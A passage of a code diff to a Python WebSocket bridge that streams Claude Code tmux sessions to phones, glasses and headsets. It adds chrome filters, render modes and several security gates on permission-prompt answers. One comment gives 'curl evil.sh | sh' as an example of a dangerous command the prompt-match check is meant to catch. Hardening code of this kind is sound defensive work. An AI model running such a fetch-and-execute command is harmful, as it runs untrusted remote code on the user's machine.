-        return True
-    return False
+        return "anchor"
+    return ""
 
 
 def _strip_task_summary(lines: list[str]) -> list[str]:
     """Drop Claude Code's TodoWrite task-summary widget rows.
 
-    Per-line filter — no anchoring or contiguity requirement. The
-    header and tail patterns are specific enough that false-positives
-    on real assistant content are vanishingly unlikely; the checkbox
-    prefix is a small risk if a user pastes a Markdown checklist, but
-    on the lens the user is reading streaming assistant output, not
-    composing checklists, so the trade is correct.
+    Anchor rows (header, tail, thinking fold, BOX-glyph checkboxes, tree-
+    connector rows) are stripped wherever they appear — position-free, so a
+    widget whose header has already scrolled out of the capture still goes.
+    That global behaviour is deliberate and unchanged.
+
+    Bare ``✓``/``✔`` rows are the one ambiguous case, because test runners
+    use those glyphs too, so they are only stripped when they are *adjacent*
+    to the widget: the walk grows outward from each anchor through runs of
+    contiguous check rows. A widget's completed items are always touching
+    their header or their pending siblings; a test runner's pass lines are
+    not touching either.
+
+    The residual failure mode is a fully-completed widget whose header has
+    scrolled away — every row a bare ``✓``, nothing to anchor against, so it
+    leaks onto the lens. That is the right way round to be wrong: a stray
+    widget row costs a line of screen, a swallowed ``✓ 41 passed`` costs the
+    user the answer they were looking for.
     """
-    return [ln for ln in lines if not _is_task_summary_row(ln)]
+    classes = [_task_row_class(ln) for ln in lines]
+    drop = {i for i, kind in enumerate(classes) if kind == "anchor"}
+    for anchor in sorted(drop):
+        for step in (-1, 1):
+            j = anchor + step
+            while 0 <= j < len(lines) and classes[j] == "check" and j not in drop:
+                drop.add(j)
+                j += step
+    return [ln for i, ln in enumerate(lines) if i not in drop]
 
 
 # Claude Code's end-of-session feedback prompt:
@@ -897,8 +1443,18 @@ _WORKING_STATUS_RE = re.compile(
     # markdown bullet and would false-strip "- Verb-ing X (Ns)" prose.)
     r"[\*\+✢-❇·•⠀-⣿]+"
     r"\s*[A-Za-z]+ing\b"                                  # gerund verb (Cogitating, Thinking, …)
-    r"[^)]*\("                                            # … up to an opening paren
-    r"[^)]*\b(?:\d+\s*[ms]\b|esc\s+to\s+interrupt\b)",    # elapsed or interrupt inside the parens
+    # … up to an opening paren. The class excludes "(" and is bounded on
+    # purpose. Written as `[^)]*\(` it was AMBIGUOUS -- the negated class
+    # matched "(" too, so every paren in the row was retried as the anchor and
+    # each retry re-scanned the tail through the second `[^)]*`, making the
+    # match quadratic in row length. This regex runs synchronously on the event
+    # loop over up to 2000 rows of spliced transcript every 500 ms, so a single
+    # 4000-char row of "(" cost 35 ms and 300 of them froze the whole bridge
+    # for 2.5 s per tick. Excluding "(" leaves exactly one way to reach the
+    # anchor, which makes it linear. The real status line has one paren group
+    # directly after the verb, so nothing is lost.
+    r"[^(]{0,80}\("
+    r"[^)]{0,120}\b(?:\d+\s*[ms]\b|esc\s+to\s+interrupt\b)",  # elapsed or interrupt inside
     re.IGNORECASE,
 )
 
@@ -1006,8 +1562,98 @@ def _strip_assistant_chrome_anywhere(lines: list[str]) -> list[str]:
     return out
 
 
-async def _terminal_poll_loop(session_id: str, ws: WebSocket) -> None:
-    """Poll tmux capture-pane every ~1s and push content when it changes."""
+def _apply_chrome_filters(lines: list[str]) -> list[str]:
+    """Strip assistant TUI chrome from a capture-pane snapshot.
+
+    This is the ``filtered`` terminal mode: the small-screen clients (phone
+    mirror, glasses lens) get the conversation without Claude Code's static
+    footer, tip rows, task widget and decorative dividers, because on a 22-row
+    lens that chrome eats a third of the row budget.
+
+    The ``ansi`` mode (a headset panel, ~48 rows, where the point is fidelity)
+    skips this entirely and ships the pane verbatim. SGR escapes survive BOTH
+    paths -- capture-pane runs with ``-e`` and nothing here strips them;
+    ``_strip_ansi`` is only ever used to build a plain-text *comparison* key
+    inside the predicates below.
+    """
+    art_count = _count_top_pixel_art_rows(lines)
+    art_rows = lines[:art_count]
+    body = lines[art_count:]
+
+    # Drop Claude Code's plan-mode `─` section dividers anywhere
+    # they appear. Must run before the footer strip so interleaved
+    # decorative rows don't block the footer walker from reaching
+    # up to the real status/hint chrome.
+    body = _strip_decorative_divider_rows(body)
+
+    # Strip Claude Code's status footer (branch/model/token line
+    # and bypass-permissions hint). These are static chrome that
+    # always sits below the user's input prompt; on the glasses
+    # lens they eat 2-3 rows of the 22 visible. The user wants
+    # to see their actual typing, not the same hint every refresh.
+    body = _strip_assistant_status_footer(body)
+    # Second chrome pass: scan EVERYWHERE for chrome rows that
+    # the bottom-walker missed. Claude Code paints the agent-
+    # spawn selection menu ("⏺ main", "◯ Explore", ...) BELOW
+    # the status chrome, which strands the chrome mid-snapshot
+    # where the bottom-walker won't reach it. This filter is
+    # safe to do globally because the chrome patterns are
+    # specific enough (`🌿 main`, `⏵⏵ bypass permissions`) to
+    # avoid false-positives on real conversation text.
+    body = _strip_assistant_chrome_anywhere(body)
+    # Task-summary pass: drop Claude Code's TodoWrite widget
+    # (header + checkbox rows + truncation tail). On the lens
+    # this widget eats 6-8 of 23 visible rows for no
+    # actionable signal — voice TTS already announces task
+    # completions, and the phone-side pager doesn't need to
+    # see it either since the user can ask the assistant
+    # directly. The patterns are widget-specific so
+    # false-positives on real conversation are vanishingly
+    # rare.
+    body = _strip_task_summary(body)
+    # Session-feedback pass: drop Claude Code's "How is Claude
+    # doing this session?" survey prompt. Same justification —
+    # not actionable on the heads-up display.
+    body = _strip_feedback_prompt(body)
+    # Tip pass: drop the rotating "Tip: Use /config …" onboarding
+    # hints Claude Code paints below the input box. Pure chrome on
+    # the lens — the user can't act on a slash-command hint from
+    # their glasses, and it eats a row every refresh.
+    body = _strip_tip_rows(body)
+    # Context-indicator pass: drop Claude Code's "NN% context used" /
+    # auto-compact status row. The lens footer shows the live context %
+    # (see GlassesDisplayManager.buildFooter), so the inline chrome row
+    # is redundant — cutting it keeps the read view cleaner.
+    body = _strip_context_indicator_rows(body)
+    # NOTE: Claude Code's animated working-status row ("✻ Cogitating…
+    # (5m 42s)") is intentionally NOT stripped here. It's useful live
+    # signal everywhere the shared terminal_content goes — the iOS phone
+    # mirror AND the Glassbox web view (which proxies this feed through
+    # its own server, so it has no browser Origin to single out). The
+    # ONLY place it's unwanted is the GLASSES LENS, so that strip lives
+    # lens-side in iOS (GlassesDisplayManager.isWorkingStatusRow, applied
+    # in AppState's onRequestTranscriptLines). _strip_working_status_rows
+    # / _is_working_status_row + the complete-frame _WORKING_STATUS_RE
+    # are kept here purely as the source of truth that the Swift port
+    # mirrors (and for tests).
+
+    # Per-line strip of long leading/trailing decorative runs
+    # (e.g. `---------------- mem0 integration` → ` mem0
+    # integration`). Catches the mixed-content case that the
+    # pure-row strip can't, leaves code constructs like
+    # `--no-verify` and 2-char-bordered headers untouched.
+    body = [_strip_long_decorative_runs(ln) for ln in body]
+
+    return art_rows + body
+
+
+async def _terminal_poll_loop(
+    session_id: str, ws: WebSocket, mode: str = _DEFAULT_TERMINAL_MODE
+) -> None:
+    """Poll tmux capture-pane every ~1s and push content when it changes.
+
+    ``mode`` selects the render path -- see ``_apply_chrome_filters``.
+    """
     session = sessions.get_session(session_id)
     if not session or not session.tmux_target:
         return
@@ -1078,75 +1724,7 @@ async def _terminal_poll_loop(session_id: str, ws: WebSocket) -> None:
             # user wants to see, not chrome to strip. Returns 0 (= no
             # art held) for the common case where the buffer has scrolled
             # past the icon, and the loop processes lines as before.
-            art_count = _count_top_pixel_art_rows(lines)
-            art_rows = lines[:art_count]
-            body = lines[art_count:]
-
-            # Drop Claude Code's plan-mode `─` section dividers anywhere
-            # they appear. Must run before the footer strip so interleaved
-            # decorative rows don't block the footer walker from reaching
-            # up to the real status/hint chrome.
-            body = _strip_decorative_divider_rows(body)
-
-            # Strip Claude Code's status footer (branch/model/token line
-            # and bypass-permissions hint). These are static chrome that
-            # always sits below the user's input prompt; on the glasses
-            # lens they eat 2-3 rows of the 22 visible. The user wants
-            # to see their actual typing, not the same hint every refresh.
-            body = _strip_assistant_status_footer(body)
-            # Second chrome pass: scan EVERYWHERE for chrome rows that
-            # the bottom-walker missed. Claude Code paints the agent-
-            # spawn selection menu ("⏺ main", "◯ Explore", ...) BELOW
-            # the status chrome, which strands the chrome mid-snapshot
-            # where the bottom-walker won't reach it. This filter is
-            # safe to do globally because the chrome patterns are
-            # specific enough (`🌿 main`, `⏵⏵ bypass permissions`) to
-            # avoid false-positives on real conversation text.
-            body = _strip_assistant_chrome_anywhere(body)
-            # Task-summary pass: drop Claude Code's TodoWrite widget
-            # (header + checkbox rows + truncation tail). On the lens
-            # this widget eats 6-8 of 23 visible rows for no
-            # actionable signal — voice TTS already announces task
-            # completions, and the phone-side pager doesn't need to
-            # see it either since the user can ask the assistant
-            # directly. The patterns are widget-specific so
-            # false-positives on real conversation are vanishingly
-            # rare.
-            body = _strip_task_summary(body)
-            # Session-feedback pass: drop Claude Code's "How is Claude
-            # doing this session?" survey prompt. Same justification —
-            # not actionable on the heads-up display.
-            body = _strip_feedback_prompt(body)
-            # Tip pass: drop the rotating "Tip: Use /config …" onboarding
-            # hints Claude Code paints below the input box. Pure chrome on
-            # the lens — the user can't act on a slash-command hint from
-            # their glasses, and it eats a row every refresh.
-            body = _strip_tip_rows(body)
-            # Context-indicator pass: drop Claude Code's "NN% context used" /
-            # auto-compact status row. The lens footer shows the live context %
-            # (see GlassesDisplayManager.buildFooter), so the inline chrome row
-            # is redundant — cutting it keeps the read view cleaner.
-            body = _strip_context_indicator_rows(body)
-            # NOTE: Claude Code's animated working-status row ("✻ Cogitating…
-            # (5m 42s)") is intentionally NOT stripped here. It's useful live
-            # signal everywhere the shared terminal_content goes — the iOS phone
-            # mirror AND the Glassbox web view (which proxies this feed through
-            # its own server, so it has no browser Origin to single out). The
-            # ONLY place it's unwanted is the GLASSES LENS, so that strip lives
-            # lens-side in iOS (GlassesDisplayManager.isWorkingStatusRow, applied
-            # in AppState's onRequestTranscriptLines). _strip_working_status_rows
-            # / _is_working_status_row + the complete-frame _WORKING_STATUS_RE
-            # are kept here purely as the source of truth that the Swift port
-            # mirrors (and for tests).
-
-            # Per-line strip of long leading/trailing decorative runs
-            # (e.g. `---------------- mem0 integration` → ` mem0
-            # integration`). Catches the mixed-content case that the
-            # pure-row strip can't, leaves code constructs like
-            # `--no-verify` and 2-char-bordered headers untouched.
-            body = [_strip_long_decorative_runs(ln) for ln in body]
-
-            lines = art_rows + body
+            lines = lines if mode == "ansi" else _apply_chrome_filters(lines)
 
             # --- Transcript scrollback splice -----------------------------
             # When a transcript JSONL exists for this session, prepend the
@@ -1225,6 +1803,7 @@ async def _terminal_poll_loop(session_id: str, ws: WebSocket) -> None:
                         "type": "terminal_content",
                         "session_id": session_id,
                         "lines": send_lines,
+                        "mode": mode,
                     })
                 except Exception:
                     break
@@ -1247,6 +1826,7 @@ async def _terminal_poll_loop(session_id: str, ws: WebSocket) -> None:
 async def _handle_terminal_subscribe(data: dict, ws: WebSocket) -> None:
     """Start polling tmux for a session and streaming to the subscriber."""
     session_id = data.get("session_id", "")
+    mode = _coerce_terminal_mode(data.get("mode"))
     session = sessions.get_session(session_id)
     if not session or not session.tmux_target:
         # MUST be terminal_error (not generic "error") so iOS clears the
@@ -1263,8 +1843,8 @@ async def _handle_terminal_subscribe(data: dict, ws: WebSocket) -> None:
         except Exception:
             pass
         return
-    _target, tmux_err = _validate_tmux_pane_target(session.tmux_target)
-    if tmux_err:
+    target, tmux_err = _validate_tmux_pane_target(session.tmux_target)
+    if tmux_err or not target:
         try:
             await send_signed(ws,{
                 "type": "terminal_error",
@@ -1274,6 +1854,38 @@ async def _handle_terminal_subscribe(data: dict, ws: WebSocket) -> None:
         except Exception:
             pass
         return
+
+    # Geometry: an `ansi` subscriber may size the pane to its panel so the
+    # assistant TUI reflows to the width it is actually being read at. Only
+    # `ansi` clients do this -- the phone and the lens render whatever size
+    # they are handed and must never resize the pane out from under the
+    # terminal the user has open on their Mac.
+    if mode == "ansi":
+        geometry = _coerce_terminal_geometry(data)
+        if geometry is not None:
+            cols, rows = geometry
+            if await _acquire_geometry(session_id, target, ws, cols, rows):
+                log_event("info", session.project,
+                          f"Terminal geometry {cols}x{rows}: {session_id[:12]}...")
+            else:
+                # Say so. A refused resize used to be silent, which meant the
+                # pane kept a width the client had stopped drawing at: content
+                # arrived 156 columns wide for a panel rendering 78, cut or
+                # wrapped, with nothing anywhere to explain it. The client can
+                # now narrow its own render to match instead of guessing.
+                actual = await _read_window_geometry(target)
+                try:
+                    await send_signed(ws, {
+                        "type": "terminal_error",
+                        "session_id": session_id,
+                        "message": (
+                            f"geometry {cols}x{rows} not applied; pane is "
+                            f"{actual[0]}x{actual[1]}" if actual else
+                            f"geometry {cols}x{rows} not applied"
+                        ),
+                    })
+                except Exception:
+                    pass
 
     # NOTE: we deliberately do NOT raise this pane's tmux history-limit here.
     # tmux fixes a pane's history_limit at CREATION time, so `set-option
@@ -1299,27 +1911,36 @@ async def _handle_terminal_subscribe(data: dict, ws: WebSocket) -> None:
     # off the "Connecting to terminal…" wait.
     async with _terminal_subs_lock:
         existing = _terminal_subs.get(session_id, {}).get(ws)
-        if existing is not None and not existing.done():
+        if existing is not None and not existing.task.done():
+            if existing.mode == mode:
+                log_event("info", session.project,
+                          f"Terminal subscribe ignored (already active): {session_id[:12]}...")
+                return
+            # Mode switch on a live subscription (e.g. the same client moving
+            # a pane from the phone mirror to a headset panel). The loop bakes
+            # the mode in, so it has to restart -- one lost poll cycle, which
+            # is cheaper than teaching the loop to re-read it mid-flight.
             log_event("info", session.project,
-                      f"Terminal subscribe ignored (already active): {session_id[:12]}...")
-            return
-        # No live subscription (or the previous one finished/errored).
-        # Cancel any tombstone task and start fresh.
-        if existing is not None:
-            existing.cancel()
+                      f"Terminal mode {existing.mode} -> {mode}: {session_id[:12]}...")
+            existing.task.cancel()
+        elif existing is not None:
+            # Tombstone from a loop that finished/errored -- cancel and restart.
+            existing.task.cancel()
 
-        task = asyncio.create_task(_terminal_poll_loop(session_id, ws))
-        _terminal_subs.setdefault(session_id, {})[ws] = task
-    log_event("info", session.project, f"Terminal subscribed: {session_id[:12]}...")
+        task = asyncio.create_task(_terminal_poll_loop(session_id, ws, mode))
+        _terminal_subs.setdefault(session_id, {})[ws] = TerminalSub(task=task, mode=mode)
+    log_event("info", session.project,
+              f"Terminal subscribed ({mode}): {session_id[:12]}...")
 
 
 async def _handle_terminal_unsubscribe(data: dict, ws: WebSocket) -> None:
     """Stop streaming terminal content for a session."""
     session_id = data.get("session_id", "")
+    await _release_geometry(session_id, ws)
     async with _terminal_subs_lock:
         subs = _terminal_subs.get(session_id)
         if subs and ws in subs:
-            subs[ws].cancel()
+            subs[ws].task.cancel()
             del subs[ws]
             if not subs:
                 del _terminal_subs[session_id]
@@ -1372,7 +1993,41 @@ async def _handle_terminal_send_keys(data: dict, ws: WebSocket) -> None:
     # Branch B: raw-keys (legacy / terminal pager).
     # ------------------------------------------------------------------
     keys = data.get("keys", "")
-    if not keys:
+    raw_sequence = data.get("key_sequence")
+
+    # `keys` and `key_sequence` are documented as mutually exclusive, and
+    # `literal` as applying to `keys` only. Accepting a frame that carries both
+    # is what let `literal` mean one thing to the gate and another to delivery.
+    # Refusing the contradiction is clearer than picking a winner.
+    if raw_sequence is not None and keys:
+        await _form_error(
+            ws, session_id,
+            "Send either 'keys' or 'key_sequence', not both.",
+        )
+        return
+
+    sequence = _coerce_key_sequence(raw_sequence)
+    if raw_sequence is not None and sequence is None:
+        # Explicitly rejected rather than silently ignored: an unknown key
+        # name makes tmux exit non-zero and do nothing, and a keyboard whose
+        # keystrokes vanish without explanation is worse than one that errors.
+        try:
+            await send_signed(ws, {
+                "type": "error",
+                "session_id": session_id,
+                "message": "Invalid key_sequence",
+            })
+        except Exception:
+            pass
+        return
+    if sequence is None and not keys:
+        return
+
+    if not isinstance(keys, str):
+        # `len(keys)` below raised a TypeError out of the receive loop, which
+        # catches only WebSocketDisconnect — so one malformed frame tore the
+        # client's connection down.
+        await _form_error(ws, session_id, "field 'keys' must be a string")
         return
 
     # Cap key input length to prevent abuse
@@ -1380,22 +2035,42 @@ async def _handle_terminal_send_keys(data: dict, ws: WebSocket) -> None:
     if len(keys) > _MAX_KEYS_LEN:
         keys = keys[:_MAX_KEYS_LEN]
 
-    # Optional choice-commit gate for older iOS clients that still
-    # build the keystroke client-side. New clients use Branch A above.
-    expected_choice_sig = data.get("choice_signature")
-    if expected_choice_sig:
-        from bridge.activity import _LAST_CHOICE_FOR_SESSION
-        live = _LAST_CHOICE_FOR_SESSION.get(session_id)
-        if live is None or live.signature != expected_choice_sig:
-            try:
-                await send_signed(ws, {
-                    "type": "error",
-                    "session_id": session_id,
-                    "message": "Choice prompt no longer live — commit ignored.",
-                })
-            except Exception:
-                pass
-            return
+    # A decision on screen may not be ANSWERED with raw keys. It may still be
+    # dismissed, interrupted and scrolled, which is the distinction this gate
+    # has to draw and did not.
+    #
+    # Two ways the first attempt was wrong, both found by review:
+    #
+    # - Too narrow. It consulted only `_LAST_CHOICE_FOR_SESSION`, and
+    #   `activity._broadcast_question_form` *pops* that entry while a
+    #   multi-question form is live ("a live form supersedes any single-choice
+    #   tracking"). The two caches are mutually exclusive, so with an
+    #   AskUserQuestion form on screen the gate saw nothing and `{"keys":
+    #   "1\n"}` went straight through — the substitution this exists to stop.
+    #
+    # - Too broad. It refused every raw-key shape, including `Escape`, which is
+    #   the only way to dismiss a choice prompt: the headset's `interrupt()` and the
+    #   iPhone key bar both send it, and docs/api.md tells clients to prefer it
+    #   over `stop_session` because a second Ctrl-C ends the session. Refusing it
+    #   left a live prompt with no way out but the route the docs warn against.
+    if _live_decision_for(session_id) is not None and _keys_would_answer(data):
+        log_event(
+            "warning", "bridge",
+            f"Raw keys refused: a decision is open on {session_id[:12]}...",
+        )
+        await _form_error(
+            ws, session_id,
+            "A question is open in this session — answer it with choice_index, "
+            "not raw keys. Escape or Ctrl-C still work.",
+        )
+        return
+
+    # A commit that arrives with a signature when nothing is live is stale.
+    if data.get("choice_signature"):
+        await _form_error(
+            ws, session_id, "Choice prompt no longer live — commit ignored."
+        )
+        return
 
     session = sessions.get_session(session_id)
     if not session or not session.tmux_target:
@@ -1418,23 +2093,29 @@ async def _handle_terminal_send_keys(data: dict, ws: WebSocket) -> None:
             pass
         return
 
-    literal = data.get("literal", False)
+    literal = bool(data.get("literal", False))
 
-    try:
-        cmd = ["tmux", "send-keys", "-t", tmux_target]
-        if literal:
-            cmd.append("-l")
-        cmd.append(keys)
-        proc = await asyncio.create_subprocess_exec(
-            *cmd,
-            stdout=asyncio.subprocess.DEVNULL,
-            stderr=asyncio.subprocess.DEVNULL,
-            env=get_subprocess_env(),
-        )
-        await proc.wait()
-        log_event("info", session.project, f"Sent keys: {keys}{' (literal)' if literal else ''}")
-    except Exception as exc:
-        log_event("error", session.project, f"Failed to send keys: {exc}")
+    # A key_sequence is always interpreted (never -l): its members are tmux
+    # key NAMES, which is the whole point of validating them.
+    if sequence is not None:
+        args, literal, shown = sequence, False, " ".join(sequence)
+    else:
+        args, shown = [keys], keys
+
+    ok, err = await _send_tmux_keys(tmux_target, args, literal=literal)
+    if not ok:
+        log_event("error", session.project, f"Failed to send keys: {err}")
+        try:
+            # Generic message -- don't leak tmux stderr to the client.
+            await send_signed(ws, {
+                "type": "error",
+                "session_id": session_id,
+                "message": "Keys not delivered (pane may be gone)",
+            })
+        except Exception:
+            pass
+        return
+    log_event("info", session.project, f"Sent keys: {shown}{' (literal)' if literal else ''}")
 
 
 async def _handle_choice_commit(data: dict, ws: WebSocket, session_id: str) -> None:
@@ -1533,6 +2214,25 @@ async def _handle_choice_commit(data: dict, ws: WebSocket, session_id: str) -> N
             pass
         return
 
+    #   3. A DIFFERENT prompt wearing the same signature. The two checks above
+    #      both key on `signature`, which covers the title and option labels
+    #      only -- boilerplate on a permission dialog -- so they cannot tell
+    #      "approve `git status`" from "approve `curl evil.sh | sh`". Comparing
+    #      what is on screen now against what the user was last SHOWN (the
+    #      cached prompt, body included) is the check that distinguishes them.
+    #      Enforced server-side rather than by trusting an echoed value, so it
+    #      protects older clients that only know about `choice_signature`.
+    if not _commit_matches_shown(session_id, fresh):
+        log_event(
+            "warning", session.project,
+            "Choice commit refused: the prompt on screen is not the one that was shown",
+        )
+        await _form_error(
+            ws, session_id,
+            "The prompt on screen changed — nothing was answered. Look again.",
+        )
+        return
+
     # Clamp choice_index to the live option count — protects against a
     # racing prompt update where iOS picked option 6 of an old 6-option
     # list but the new prompt only has 4 options. Signature gate above
@@ -1551,7 +2251,7 @@ async def _handle_choice_commit(data: dict, ws: WebSocket, session_id: str) -> N
         keys = f"{choice_index + 1}\n"
         try:
             proc = await asyncio.create_subprocess_exec(
-                "tmux", "send-keys", "-t", tmux_target, "-l", keys,
+                "tmux", "send-keys", "-t", tmux_target, "-l", "--", keys,
                 stdout=asyncio.subprocess.DEVNULL,
                 stderr=asyncio.subprocess.DEVNULL,
                 env=get_subprocess_env(),
@@ -1591,7 +2291,152 @@ async def _capture_clean_lines(tmux_target: str) -> list[str] | None:
         return None
 
 
-async def _capture_and_detect_choice(tmux_target: str):
+#: Frame fields every handler reads with ``data.get("<field>", "")`` and then
+#: treats as a string -- slicing it, lowercasing it, regex-matching it, or using
+#: it as a dict key. The ``""`` default only applies to a MISSING key, so any
+#: other type arrives intact.
+_FRAME_STRING_FIELDS = ("session_id", "tmux_session", "project", "task_id")
+
+
+def _frame_string_fields_ok(frame: dict) -> bool:
+    """True unless this frame carries one of those fields with a non-string value.
+
+    Every handler takes them straight off the frame and treats them as strings,
+    so a wrong type raises out of the handler -- and that is not
+    ``WebSocketDisconnect``, so it escapes the receive loop: the client is
+    dropped, losing its terminal subscriptions and its geometry lease, and the
+    developer's tmux pane stays at panel width. Measured instances:
+
+    * ``{"session_id": []}`` -> "unhashable type: 'list'" in ``get_session``;
+    * ``{"session_id": null}`` -> ``None[:12]`` in ``_handle_terminal_unsubscribe``;
+    * ``{"tmux_session": 5}`` -> "expected string or bytes-like object" in
+      ``_is_safe_tmux_target``;
+    * ``{"tmux_session": {}}`` -> "unhashable type: 'dict'".
+
+    ``None`` is REJECTED, which an earlier version of this allowed on the
+    reasoning that it "already means absent everywhere downstream". That was
+    simply untested and false -- see the ``[:12]`` above. No client sends it:
+    iOS omits the key when the value is nil (``App/Models.swift``) and the
+    Kotlin builders take a non-null ``String``.
+
+    Checked once where frames arrive rather than in each handler, because that
+    is the only place that does not rely on the next handler remembering.
+    """
+    for field in _FRAME_STRING_FIELDS:
+        if field in frame and not isinstance(frame[field], str):
+            return False
+    return True
+
+
+def _live_choice_for(session_id: str) -> "ChoicePrompt | None":
+    """The choice prompt this session last broadcast, or None.
+
+    The id is type-checked because it comes straight from a client frame: an
+    unhashable one (``{"session_id": []}``) made the dict lookup raise, and that
+    escapes a receive loop which catches only WebSocketDisconnect.
+    """
+    if not isinstance(session_id, str):
+        return None
+    from bridge.activity import _LAST_CHOICE_FOR_SESSION
+
+    return _LAST_CHOICE_FOR_SESSION.get(session_id)
+
+
+def _live_decision_for(session_id: str) -> "ChoicePrompt | MultiQuestionForm | None":
+    """Any decision this session last broadcast -- a choice prompt OR a form.
+
+    Both caches have to be consulted, because they are mutually exclusive:
+    ``activity._broadcast_question_form`` pops the choice entry when a form goes
+    up, so asking only about choices reads "nothing on screen" for the entire
+    life of an AskUserQuestion form.
+    """
+    if not isinstance(session_id, str):
+        return None
+    from bridge.activity import _LAST_CHOICE_FOR_SESSION, _LAST_FORM_FOR_SESSION
+
+    return (
+        _LAST_CHOICE_FOR_SESSION.get(session_id)
+        or _LAST_FORM_FOR_SESSION.get(session_id)
+    )
+
+
+#: Named tmux keys that cannot answer a widget: they dismiss it, interrupt the
+#: agent, or move the view. Everything else -- Enter above all -- can.
+#:
+#: `BTab` is deliberately NOT here, though it looks like navigation and the
+#: iPhone key bar offers it as "S-Tab": Claude Code's ExitPlanMode prompt is
+#: anchored on the footer "shift+tab to approve with this feedback", so
+#: shift-tab APPROVES a plan. Listing it meant a client could approve one while
+#: skipping the commit path's shown-prompt check entirely. `Tab` is absent for
+#: the same reason even though it only navigates -- the pair should behave alike,
+#: and the key bar still works whenever no decision is open.
+#:
+#: `C-d` and `C-g` are also absent: no client sends them for navigation, and
+#: C-d is EOF, which is not something to wave through at a live prompt.
+_NON_ANSWERING_KEYS = frozenset({
+    "escape", "c-c", "pageup", "pagedown", "ppage", "npage",
+    "home", "end", "up", "down", "left", "right",
+})
+
+
+def _keys_would_answer(data: dict) -> bool:
+    """True when this raw-key payload could commit an answer to a widget.
+
+    ``Enter`` is what confirms the highlighted row, and literal text typed into a
+    select widget is ignored except that the Enter after it confirms whatever the
+    cursor is on -- which is how a ``/deny`` once approved the command it meant
+    to refuse. Arrow keys move the cursor but commit nothing, and the commit path
+    re-reads the cursor from a fresh capture, so they are safe to pass through.
+    """
+    raw_sequence = data.get("key_sequence")
+    names = []
+    if isinstance(raw_sequence, list):
+        names.extend(str(k) for k in raw_sequence)
+    keys = data.get("keys")
+    if isinstance(keys, str) and keys:
+        names.append(keys)
+
+    # `literal` only ever described `keys` (docs/api.md: "Applies to `keys`
+    # only"; "key_sequence is always interpreted"). Returning on it was a
+    # complete bypass: with `literal: true` and no `keys`, this answered
+    # `bool(None)` -> False and the gate was skipped, while the handler went on
+    # to deliver `key_sequence` interpreted -- it overrides literal to False
+    # there. So `literal` decided the security question and was ignored for
+    # delivery, and `{"literal": true, "key_sequence": ["Enter"]}` pressed Enter
+    # on a live permission dialog. Judge the keys that will actually be sent.
+    if data.get("literal") and not names:
+        # Typing with no named keys. The text is discarded by the widget; the
+        # risk is the Enter that arrives with or after it.
+        return bool(keys)
+    if data.get("literal") and isinstance(keys, str) and keys:
+        # Literal text is never navigation, whatever it spells.
+        return True
+
+    for name in names:
+        candidate = name.strip().lower()
+        if candidate and candidate not in _NON_ANSWERING_KEYS:
+            return True
+    return False
+
+
+def _commit_matches_shown(session_id: str, fresh: "ChoicePrompt") -> bool:
+    """True when *fresh* is the prompt this session last broadcast to clients.
+
+    The cached entry is what the lens card was built from, so its ``commit_key``
+    is a fingerprint of what the human read. A mismatch means the dialog was
+    replaced between the card going up and the answer coming back, and the
+    answer belongs to a prompt nobody approved.
+
+    No cached prompt means nothing was ever shown for this session, so there is
+    nothing a human could have been deciding about -- refuse.
+    """
+    shown = _live_choice_for(session_id)
+    if shown is None:
+        return False
+    return getattr(shown, "commit_key", None) == getattr(fresh, "commit_key", None)
+
+
+async def _capture_and_detect_choice(tmux_target: str) -> "ChoicePrompt | None":
     """Capture the pane and run ``detect_choice_prompt`` against it.
 
     Returns the freshly-detected ``ChoicePrompt`` (with current
@@ -1648,6 +2493,7 @@ async def _tmux_send_keys(
     cmd = ["tmux", "send-keys", "-t", tmux_target]
     if literal:
         cmd.append("-l")
+    cmd.append("--")  # see _send_tmux_keys: a "-"-leading payload is a flag
     cmd.extend(keys)
     proc = await asyncio.create_subprocess_exec(
         *cmd,
@@ -1743,7 +2589,12 @@ async def _handle_form_action(data: dict, ws: WebSocket, session_id: str) -> Non
     # so an empty note must bail rather than send a bare Enter.
     note_text = ""
     if action == "note":
-        note_text = _sanitize_message(str(data.get("text", ""))).strip()[:500]
+        # _sanitize_dispatch_text, not _sanitize_message: this is typed into a
+        # pane with `send-keys -l` and confirmed with a separate Enter, and
+        # _sanitize_message keeps CR/LF — an embedded newline submits early and
+        # the remainder lands on whatever screen comes next. On an
+        # AskUserQuestion review screen the highlighted row is "Submit answers".
+        note_text = _sanitize_dispatch_text(data.get("text", ""))[:500]
         if not note_text:
             await _form_error(ws, session_id, "Empty note — nothing to dictate.")
             return
@@ -1816,7 +2667,7 @@ async def _send_tui_choice(
     # and emit the matching ANSI escape (or \r for Enter) to the pane.
     try:
         proc = await asyncio.create_subprocess_exec(
-            "tmux", "send-keys", "-t", tmux_target, *nav_keys,
+            "tmux", "send-keys", "-t", tmux_target, "--", *nav_keys,
             stdout=asyncio.subprocess.DEVNULL,
             stderr=asyncio.subprocess.DEVNULL,
             env=get_subprocess_env(),
@@ -1837,7 +2688,8 @@ async def _send_tui_choice(
 async def _handle_spawn_session(data: dict, ws: WebSocket) -> None:
     """Spawn a new assistant session in a tmux window."""
     project_name = data.get("project", "")
-    prompt = _sanitize_message(data.get("prompt", ""))
+    # Typed into the new pane with `send-keys -l`; see the note on note_text.
+    prompt = _sanitize_dispatch_text(data.get("prompt", ""))
     raw_assistant = data.get("assistant")
     # Optional cockpit overrides (Grok family): model id + reasoning effort.
     raw_model = data.get("model")
@@ -1974,6 +2826,12 @@ async def _handle_spawn_session(data: dict, ws: WebSocket) -> None:
                 tmux_target=f"{tmux_session}:0.0",
                 assistant=assistant,
             )
+            if session is None:
+                await _form_error(
+                    ws, synthetic_session_id,
+                    "Could not register the spawned session: its directory was refused.",
+                )
+                return
             sessions.set_active_project(project_name)
             reg_msg = {
                 "type": "session_registered",
@@ -2008,14 +2866,14 @@ async def _send_prompt_after_delay(tmux_session: str, project: str, prompt: str)
     await asyncio.sleep(3.0)
     try:
         p1 = await asyncio.create_subprocess_exec(
-            "tmux", "send-keys", "-t", tmux_session, "-l", prompt,
+            "tmux", "send-keys", "-t", tmux_session, "-l", "--", prompt,
             stdout=asyncio.subprocess.DEVNULL,
             stderr=asyncio.subprocess.DEVNULL,
             env=get_subprocess_env(),
         )
         await p1.wait()
         p2 = await asyncio.create_subprocess_exec(
-            "tmux", "send-keys", "-t", tmux_session, "Enter",
+            "tmux", "send-keys", "-t", tmux_session, "--", "Enter",
             stdout=asyncio.subprocess.DEVNULL,
             stderr=asyncio.subprocess.DEVNULL,
             env=get_subprocess_env(),
@@ -2046,7 +2904,7 @@ async def _handle_stop_session(data: dict, ws: WebSocket) -> None:
 
     try:
         proc = await asyncio.create_subprocess_exec(
